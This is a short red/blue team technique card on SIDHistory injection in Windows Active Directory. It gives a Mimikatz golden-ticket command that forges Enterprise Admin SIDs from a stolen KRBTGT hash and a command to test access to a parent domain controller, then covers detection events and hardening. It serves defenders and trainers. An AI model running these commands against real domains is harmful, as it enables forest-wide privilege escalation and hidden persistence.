# [PE-TOKEN-004]: SIDHistory Injection

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | PE-TOKEN-004 |
| **MITRE ATT&CK v18.1** | [Access Token Manipulation: SID-History Injection (T1134.005)](https://attack.mitre.org/techniques/T1134/005/) |
| **Tactic** | Privilege Escalation / Persistence |
| **Platforms** | Windows AD |
| **Severity** | **Critical** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** `sIDHistory` is an attribute used during domain migrations to preserve user access. It allows a user to carry SIDs from their "old" domain. If an attacker with Domain Admin rights (or KRBTGT hash) creates a Golden Ticket, they can inject arbitrary SIDs (like `500` - Administrator, or `519` - Enterprise Admin) into the PAC's `ExtraSids` field. When the ticket is presented, the target believes the user belongs to those high-privilege groups.
- **Attack Surface:** Kerberos Ticket (PAC).
- **Business Impact:** **Invisible Persistence**. A standard user account appearing as Enterprise Admin.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Compromised KRBTGT hash.
- **Tools:**
    - [Mimikatz](https://github.com/gentilkiwi/mimikatz)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Create Golden Ticket with SIDs**
Inject the Enterprise Admin SID (`-519`) of the root domain.
```cmd
kerberos::golden /user:fakeuser /domain:child.corp.local /sid:S-1-5-21-CHILD /krbtgt:HASH /sids:S-1-5-21-ROOT-519 /ptt
```

**Step 2: Verify Access**
Access the Parent Domain Controller.
```cmd
dir \\parent-dc.corp.local\c$
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 AD Logs
| Source | Event | Filter Logic |
|---|---|---|
| **Security** | 4768 / 4769 | Kerberos TGT/ST Request. Analyze the PAC (if auditing enabled) or look for `SID Filtering` dropped events if crossing trusts. |
| **Microsoft Defender for Identity** | Alert | "Suspected Golden Ticket usage (fake privilege injection)". |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **SID Filtering:** Ensure strict SID Filtering is enabled on Forest Trusts to drop `sIDHistory` claims that don't belong.
*   **KRBTGT Rotation:** Regularly rotate the KRBTGT password (twice) to invalidate old Golden Tickets.

## 7. ATTACK CHAIN
> **Preceding Technique:** [CA-UNSC-001] (DCSync)
> **Next Logical Step:** [LAT-CLASSIC-001]
